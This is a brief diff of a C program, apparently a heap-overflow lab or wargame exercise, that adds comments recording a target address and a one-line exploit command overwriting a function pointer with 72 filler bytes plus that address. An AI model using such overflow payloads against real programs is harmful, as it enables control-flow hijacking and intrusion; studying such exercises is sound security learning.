@@ -41,3 +41,5 @@ int main(int argc, char **argv)
   
   f->fp();
 }
+//0804852b
+//./heap $(python -c 'print "A"*72+"\x2b\x85\x04\x08"') 
